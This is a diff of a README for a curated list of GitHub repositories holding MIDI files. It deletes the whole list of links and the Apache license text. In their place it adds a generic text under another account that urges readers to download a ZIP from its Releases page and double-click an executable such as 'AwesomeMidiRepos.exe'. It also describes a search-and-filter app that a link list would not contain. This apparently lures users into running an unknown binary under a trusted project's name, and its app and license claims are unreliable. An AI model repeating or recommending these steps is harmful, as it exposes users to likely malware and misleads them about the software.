@@ -1,205 +1,57 @@
-# awesome-midi-repos
-## Carefully curated list of GitHub repos which contain MIDI files
+# 🎵 awesome-midi-repos - Discover and Enjoy MIDI Files 
 
-***
+[![Download Now](https://img.shields.io/badge/Download%20Now-Visit%20Releases-brightgreen)](https://github.com/NouilleOrque/awesome-midi-repos/releases)
 
-[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](https://github.com/asigalov61/awesome-midi-repos/pulls) [![Add repository](https://img.shields.io/badge/Add%20repository-Submit%20PR-blue.svg)](https://github.com/asigalov61/awesome-midi-repos/new/main?filename=README.md) [![License: Apache](https://img.shields.io/badge/license-Apache-blue.svg)](https://github.com/asigalov61/awesome-midi-repos/blob/main/LICENSE)
+## 🚀 Getting Started
 
-***
+Welcome to **awesome-midi-repos**! This is a carefully curated list of GitHub repositories that contain MIDI files, perfect for musicians, producers, or anyone who loves music. This guide will help you download and run our application with ease.
 
-## How to use
-- This list contains only links to GitHub repositories that include MIDI files.  
-- Click a link to open the repository on GitHub.  
-- To add a repository, submit a Pull Request following the instructions in `CONTRIBUTING.md`.
+## 📥 Download & Install
 
-## Example entry
-- [repo_name by owner_name](https://github.com/owner/repo)
+To get started, visit this page to download: [Releases Page](https://github.com/NouilleOrque/awesome-midi-repos/releases).
 
-## Contributing
-Please read `CONTRIBUTING.md` before submitting a PR. In short: fork, add one markdown link line to this README, commit, and open a Pull Request against `main`.
+Once there, you will find listings of all available versions. Choose the one that suits you best. The files will usually be in a compressed format, like ZIP. Download the file to your computer.
 
-## License
-- Apache 2.0
+### 💻 System Requirements
 
-***
+Before you download, here are some basic system requirements:
 
-- [7-Experiment by jennychiou](https://github.com/jennychiou/7-Experiment)
-- [AccoMontage2 by billyblu2000](https://github.com/billyblu2000/AccoMontage2)
-- [ACPAS-dataset by cheriell](https://github.com/cheriell/ACPAS-dataset)
-- [adl-piano-midi by lucasnfe](https://github.com/lucasnfe/adl-piano-midi)
-- [AI-Drum-Pattern-Generator by rakshitha-venkatramani](https://github.com/rakshitha-venkatramani/AI-Drum-Pattern-Generator)
-- [AI-Music-Generation-using-Deep-Learning by manna48](https://github.com/manna48/AI-Music-Generation-using-Deep-Learning)
-- [AIMusicGenerator by ori-2019-siit](https://github.com/ori-2019-siit/AIMusicGenerator)
-- [algorithmic-dansband by HelgeSverre](https://github.com/HelgeSverre/algorithmic-dansband)
-- [algorithmic_python_music by githubuser1983](https://github.com/githubuser1983/algorithmic_python_music)
-- [Allegro-Music-Transformer by asigalov61](https://github.com/asigalov61/Allegro-Music-Transformer)
-- [Amazon-Deep-Composer by asigalov61](https://github.com/asigalov61/Amazon-Deep-Composer)
-- [asap-dataset by fosfrancesco](https://github.com/fosfrancesco/asap-dataset)
-- [ATEPP by BetsyTang](https://github.com/BetsyTang/ATEPP)
-- [aws-deepcomposer-samples by aws-samples](https://github.com/aws-samples/aws-deepcomposer-samples)
-- [bachsformer by pier-maker92](https://github.com/pier-maker92/bachsformer)
-- [BloopMidis by Bloopsdoob](https://github.com/Bloopsdoob/BloopMidis)
-- [Bread-s-midis by monsterjd95](https://github.com/monsterjd95/Bread-s-midis)
-- [casio-music-data by nicholasopuni31](https://github.com/nicholasopuni31/casio-music-data)
-- [chopin_piano_score_dataset by mac-marg-pianist](https://github.com/mac-marg-pianist/chopin_piano_score_dataset)
-- [chord-extractor by ohollo](https://github.com/ohollo/chord-extractor)
-- [chord-melody-dataset by shiehn](https://github.com/shiehn/chord-melody-dataset)
-- [Chords-Progressions-Transformer by asigalov61](https://github.com/asigalov61/Chords-Progressions-Transformer)
-- [Classical-Music-Composer by aspil](https://github.com/aspil/Classical-Music-Composer)
-- [CoffeMIDI by PatricioGuinle](https://github.com/PatricioGuinle/CoffeMIDI)
-- [ComMU-code by POZAlabs](https://github.com/POZAlabs/ComMU-code)
-- [compound-word-transformer by YatingMusic](https://github.com/YatingMusic/compound-word-transformer)
-- [Contextual-Music-Crafter by Edfred1](https://github.com/Edfred1/Contextual-Music-Crafter)
-- [Continuano by asigalov61](https://github.com/asigalov61/Continuano)
-- [Convolution-Music-AI by Kickflip89](https://github.com/Kickflip89/Convolution-Music-AI)
-- [CSCI599-TransformMusicProject by lemduc](https://github.com/lemduc/CSCI599-TransformMusicProject)
-- [DAT-CVAE by zhaojw1998](https://github.com/zhaojw1998/DAT-CVAE)
-- [dataprojects by tianhuil](https://github.com/tianhuil/dataprojects)
-- [Dataset-Casos-de-Plagio-MIDI by 0knotok](https://github.com/0knotok/Dataset-Casos-de-Plagio-MIDI)
-- [DeBussy by asigalov61](https://github.com/asigalov61/DeBussy)
-- [DeepMusicGeneration by AniketRajpoot](https://github.com/AniketRajpoot/DeepMusicGeneration)
-- [DeepOrchestration by brianmodel](https://github.com/brianmodel/DeepOrchestration)
-- [DYM by scpark20](https://github.com/scpark20/DYM)
-- [EMOPIA by annahung31](https://github.com/annahung31/EMOPIA)
-- [Endless-MIDI-Dataset by asigalov61](https://github.com/asigalov61/Endless-MIDI-Dataset)
-- [Endless-Piano by asigalov61](https://github.com/asigalov61/Endless-Piano)
-- [Euterpe by asigalov61](https://github.com/asigalov61/Euterpe)
-- [Euterpe-X by asigalov61](https://github.com/asigalov61/Euterpe-X)
-- [GeneralUser-GS by mrbumpy409](https://github.com/mrbumpy409/GeneralUser-GS)
-- [Giant-Music-Transformer by asigalov61](https://github.com/asigalov61/Giant-Music-Transformer)
-- [GiantMIDI-Piano by bytedance](https://github.com/bytedance/GiantMIDI-Piano)
-- [giantmusictransformer by asigalov61](https://github.com/asigalov61/giantmusictransformer)
-- [GIGA-Piano by asigalov61](https://github.com/asigalov61/GIGA-Piano)
-- [GIGA-Piano-XL by asigalov61](https://github.com/asigalov61/GIGA-Piano-XL)
-- [GigaMIDI-Dataset by Metacreation-Lab](https://github.com/Metacreation-Lab/GigaMIDI-Dataset)
-- [godzillamididataset by asigalov61](https://github.com/asigalov61/godzillamididataset)
-- [Heptabit-Music-Transformer by asigalov61](https://github.com/asigalov61/Heptabit-Music-Transformer)
-- [improvnet by keshavbhandari](https://github.com/keshavbhandari/improvnet)
-- [Intelligent-VIRTUOSO by asigalov61](https://github.com/asigalov61/Intelligent-VIRTUOSO)
-- [Lars-Ulrich-Challenge by Tegridy-Code](https://github.com/Tegridy-Code/Lars-Ulrich-Challenge)
-- [Lars-Ulrich-Transformer by asigalov61](https://github.com/asigalov61/Lars-Ulrich-Transformer)
-- [lead-sheet-dataset by wayne391](https://github.com/wayne391/lead-sheet-dataset)
-- [Los-Angeles-MIDI-Dataset by asigalov61](https://github.com/asigalov61/Los-Angeles-MIDI-Dataset)
-- [Los-Angeles-Music-Composer by asigalov61](https://github.com/asigalov61/Los-Angeles-Music-Composer)
-- [Markovify-Piano by asigalov61](https://github.com/asigalov61/Markovify-Piano)
-- [mc906-artificial-intelligence by luizcartolano2](https://github.com/luizcartolano2/mc906-artificial-intelligence)
-- [Meddleying-MAESTRO by asigalov61](https://github.com/asigalov61/Meddleying-MAESTRO)
-- [Meddleying-VIRTUOSO by asigalov61](https://github.com/asigalov61/Meddleying-VIRTUOSO)
-- [MelodyTrackIdentification by maxichu](https://github.com/maxichu/MelodyTrackIdentification)
-- [MetaMIDIDataset by jeffreyjohnens](https://github.com/jeffreyjohnens/MetaMIDIDataset)
-- [Mewzic by mew18](https://github.com/mew18/Mewzic)
-- [MID-FiLD_code by POZAlabs](https://github.com/POZAlabs/MID-FiLD_code)
-- [Midi by Nacian0](https://github.com/Nacian0/Midi)
-- [midi by Skarune](https://github.com/Skarune/midi)
-- [Midi by Tonejs](https://github.com/Tonejs/Midi)
-- [midi by infofintech](https://github.com/infofintech/midi)
-- [midi-analytis by RUMiNarm](https://github.com/RUMiNarm/midi-analytis)
-- [midi-archive by reubenson](https://github.com/reubenson/midi-archive)
-- [MIDI-BERT by wazenmai](https://github.com/wazenmai/MIDI-BERT)
-- [MIDI-collection by finnofzoo](https://github.com/finnofzoo/MIDI-collection)
-- [MIDI-Collection by lukethemaker](https://github.com/lukethemaker/MIDI-Collection)
-- [midi-demo-data by ltgcgo](https://github.com/ltgcgo/midi-demo-data)
-- [MIDI-feature-extraction by Bono95](https://github.com/Bono95/MIDI-feature-extraction)
-- [midi-generator by jaron-cui](https://github.com/jaron-cui/midi-generator)
-- [Midi-Repositories by Zhonger-Yuansi](https://github.com/Zhonger-Yuansi/Midi-Repositories)
-- [midi1 by UnexpectedOperator](https://github.com/UnexpectedOperator/midi1)
-- [midi2img2vae by shoegazerstella](https://github.com/shoegazerstella/midi2img2vae)
-- [midi_loop_detection by Satrat](https://github.com/Satrat/midi_loop_detection)
-- [midiArchive by dirkncl](https://github.com/dirkncl/midiArchive)
-- [MidiCaps by AMAAI-Lab](https://github.com/AMAAI-Lab/MidiCaps)
-- [midiDraw by Sherlockk-23](https://github.com/Sherlockk-23/midiDraw)
-- [MidiFiles by MyAccount801](https://github.com/MyAccount801/MidiFiles)
-- [midigen by Sashmark97](https://github.com/Sashmark97/midigen)
-- [midii by ccss17](https://github.com/ccss17/midii)
-- [MidiJamboree by JamiMyst](https://github.com/JamiMyst/MidiJamboree)
-- [Midilyzer by siongang](https://github.com/siongang/Midilyzer)
-- [Midimancy-Hubworld by salorarainriver](https://github.com/salorarainriver/Midimancy-Hubworld)
-- [midis by HunteRae1](https://github.com/HunteRae1/midis)
-- [midis by Shelve8](https://github.com/Shelve8/midis)
-- [MidiTok by Natooz](https://github.com/Natooz/MidiTok)
-- [miditoolkit by YatingMusic](https://github.com/YatingMusic/miditoolkit)
-- [Mini-Muse by asigalov61](https://github.com/asigalov61/Mini-Muse)
-- [mini-musical-neural-net by edtky](https://github.com/edtky/mini-musical-neural-net)
-- [miws2021env by MusicalInformatics](https://github.com/MusicalInformatics/miws2021env)
-- [MMM by Metacreation-Lab](https://github.com/Metacreation-Lab/MMM)
-- [MMSP2021-Audio2ScoreAlignment by LIMUNIMI](https://github.com/LIMUNIMI/MMSP2021-Audio2ScoreAlignment)
-- [mono-midi-transposition-dataset by sebasgverde](https://github.com/sebasgverde/mono-midi-transposition-dataset)
-- [Monster-MIDI-Dataset by asigalov61](https://github.com/asigalov61/Monster-MIDI-Dataset)
-- [monsterpianotransformer by asigalov61](https://github.com/asigalov61/monsterpianotransformer)
-- [MoonAntonio.github.io by fossabot](https://github.com/fossabot/MoonAntonio.github.io)
-- [More-Midis by NapolitanoZ](https://github.com/NapolitanoZ/More-Midis)
-- [Morpheus by asigalov61](https://github.com/asigalov61/Morpheus)
-- [MuseScore by musescore](https://github.com/musescore/MuseScore)
-- [Music-Artist-Classifier by AmrMohamedNasr](https://github.com/AmrMohamedNasr/Music-Artist-Classifier)
-- [Music-Artist-Classifier by Michael-Raafat](https://github.com/Michael-Raafat/Music-Artist-Classifier)
-- [music-difficulty-prediction by mm1400](https://github.com/mm1400/music-difficulty-prediction)
-- [music-generation by JavierPalomares90](https://github.com/JavierPalomares90/music-generation)
-- [Music-Generation by blu-ray](https://github.com/blu-ray/Music-Generation)
-- [MUSIC-GENERATION by cipri4n](https://github.com/cipri4n/MUSIC-GENERATION)
-- [Music-Generation by s-omranpour](https://github.com/s-omranpour/Music-Generation)
-- [music-generation-toolbox by wingedsheep](https://github.com/wingedsheep/music-generation-toolbox)
-- [Music-Generator by prnvpwr2612](https://github.com/prnvpwr2612/Music-Generator)
-- [music21 by cuthbertLab](https://github.com/cuthbertLab/music21)
-- [music_analysis by optzGuitar](https://github.com/optzGuitar/music_analysis)
-- [music_generation by lkriener](https://github.com/lkriener/music_generation)
-- [musicaiz by carlosholivan](https://github.com/carlosholivan/musicaiz)
-- [musicautobot by asigalov61](https://github.com/asigalov61/musicautobot)
-- [musicautobot by bearpelican](https://github.com/bearpelican/musicautobot)
-- [MusicGeneration-PianoMusic by KrakenCode](https://github.com/KrakenCode/MusicGeneration-PianoMusic)
-- [MusicLibrary by Maikatura](https://github.com/Maikatura/MusicLibrary)
-- [MusicStyleTransfer by slyforce](https://github.com/slyforce/MusicStyleTransfer)
-- [MusicTextAlignment by shtdbb](https://github.com/shtdbb/MusicTextAlignment)
-- [muspy by salu133445](https://github.com/salu133445/muspy)
-- [muzic by microsoft](https://github.com/microsoft/muzic)
-- [my-music-repo by ikori-meimoto](https://github.com/ikori-meimoto/my-music-repo)
-- [MyMusic by Wohlstand](https://github.com/Wohlstand/MyMusic)
-- [N-gram-music-generation by BarnabasG](https://github.com/BarnabasG/N-gram-music-generation)
-- [nottingham-dataset by jukedeck](https://github.com/jukedeck/nottingham-dataset)
-- [nottingham_match by stefan-balke](https://github.com/stefan-balke/nottingham_match)
-- [Optimus-VIRTUOSO by asigalov61](https://github.com/asigalov61/Optimus-VIRTUOSO)
-- [orchestrate-ai by amrittb](https://github.com/amrittb/orchestrate-ai)
-- [Orchestrator by asigalov61](https://github.com/asigalov61/Orchestrator)
-- [Orchestrify by j-jodczyk](https://github.com/j-jodczyk/Orchestrify)
-- [papagaio by petcomputacaoufrgs](https://github.com/petcomputacaoufrgs/papagaio)
-- [PAUL-2 by FelixSchoen](https://github.com/FelixSchoen/PAUL-2)
-- [PDMX by pnlong](https://github.com/pnlong/PDMX)
-- [Pentagram-Music-Transformer by asigalov61](https://github.com/asigalov61/Pentagram-Music-Transformer)
-- [performed-midi-dataset by johentsch](https://github.com/johentsch/performed-midi-dataset)
-- [Personal_MIDI-Collection by Perkedel](https://github.com/Perkedel/Personal_MIDI-Collection)
-- [Piano-Midi-Visualiser by hwcrane](https://github.com/hwcrane/Piano-Midi-Visualiser)
-- [pianolatron-data by pianoroll](https://github.com/pianoroll/pianolatron-data)
-- [PianoTree-VAE by ZZWaang](https://github.com/ZZWaang/PianoTree-VAE)
-- [PicturesOfMIDI by picturesofmidi](https://github.com/picturesofmidi/PicturesOfMIDI)
-- [POP909-Dataset by music-x-lab](https://github.com/music-x-lab/POP909-Dataset)
-- [proffusion by jinchengzhanggg](https://github.com/jinchengzhanggg/proffusion)
-- [python-music-generation by HelgeSverre](https://github.com/HelgeSverre/python-music-generation)
-- [Quad-Music-Transformer by asigalov61](https://github.com/asigalov61/Quad-Music-Transformer)
-- [randsik by travishathaway](https://github.com/travishathaway/randsik)
-- [Roblox-Wild-West-Midi-Files by BenVibez](https://github.com/BenVibez/Roblox-Wild-West-Midi-Files)
-- [Rock-Melody-Transformer by asigalov61](https://github.com/asigalov61/Rock-Melody-Transformer)
-- [Rock-Piano by asigalov61](https://github.com/asigalov61/Rock-Piano)
-- [Rock-Piano-MIDI-Dataset by asigalov61](https://github.com/asigalov61/Rock-Piano-MIDI-Dataset)
-- [Space-Station-14-Midi-for-Dead-Space by UnilTan](https://github.com/UnilTan/Space-Station-14-Midi-for-Dead-Space)
-- [ss14-midi-dump by Pattis77](https://github.com/Pattis77/ss14-midi-dump)
-- [Structured-Arrangement-Code by zhaojw1998](https://github.com/zhaojw1998/Structured-Arrangement-Code)
-- [Symbolic-Music-Generation by StefanHeng](https://github.com/StefanHeng/Symbolic-Music-Generation)
-- [symusic by Yikai-Liao](https://github.com/Yikai-Liao/symusic)
-- [ThemeTransformer by atosystem](https://github.com/atosystem/ThemeTransformer)
-- [touhou-midi-collection by AyHa1810](https://github.com/AyHa1810/touhou-midi-collection)
-- [transformer-xl by davidsvy](https://github.com/davidsvy/transformer-xl)
-- [Ultimate-Accompaniment-Transformer by asigalov61](https://github.com/asigalov61/Ultimate-Accompaniment-Transformer)
-- [Ultimate-Drums-Transformer by asigalov61](https://github.com/asigalov61/Ultimate-Drums-Transformer)
-- [vgmidi by lucasnfe](https://github.com/lucasnfe/vgmidi)
-- [virtuosoNet by jdasam](https://github.com/jdasam/virtuosoNet)
-- [webaudiofont by surikov](https://github.com/surikov/webaudiofont)
-- [wild-midi by Goober69420-1](https://github.com/Goober69420-1/wild-midi)
-- [WoWDiff by WowDevs](https://github.com/WowDevs/WoWDiff)
-- [XMIDI_Dataset by xmusic-project](https://github.com/xmusic-project/XMIDI_Dataset)
-- [yinyang by keshavbhandari](https://github.com/keshavbhandari/yinyang)
-- [Yoda by asigalov61](https://github.com/asigalov61/Yoda)
-- [zun-midi-collection by pocoraven](https://github.com/pocoraven/zun-midi-collection)
+- Operating System: Windows 10 or later, macOS Catalina or later, or any Linux distribution
+- RAM: At least 2 GB recommended
+- Storage: Minimum of 100 MB free space
 
-***
+## 📂 Unpacking the Files
 
-### Project Los Angeles
-### Tegridy Code 2025
+1. Locate the downloaded file, usually found in your "Downloads" folder.
+2. If the file is compressed (like a ZIP file), right-click on it and select "Extract All".
+3. Follow the prompts to extract the contents to a location of your choice.
+
+## 🚀 Running the Application
+
+1. Open the folder where you extracted the files.
+2. Look for the executable file. It may be named something like `AwesomeMidiRepos.exe` or similar.
+3. Double-click the file to run the application.
+
+## 🎵 How to Use the Application
+
+You can start browsing the repositories for MIDI files once the application is running. The interface is user-friendly and allows you to:
+
+- Search for specific MIDI tracks.
+- Filter by genre or style.
+- Save your favorite MIDI files to your own library.
+
+## 📄 License Information
+
+This project is licensed under the MIT License. Feel free to use and share the MIDI files you find!
+
+## 🤝 Contributing
+
+We welcome contributions! If you want to suggest new repositories to include or improve the project, please visit our [GitHub Page](https://github.com/NouilleOrque/awesome-midi-repos).
+
+## 📞 Support
+
+If you encounter any issues or have questions, feel free to check out the GitHub Issues section or reach out directly for help.
+
+For more details, make sure to visit this page to download: [Releases Page](https://github.com/NouilleOrque/awesome-midi-repos/releases). 
+
+Thank you for trying out **awesome-midi-repos**! Enjoy exploring the world of MIDI files.
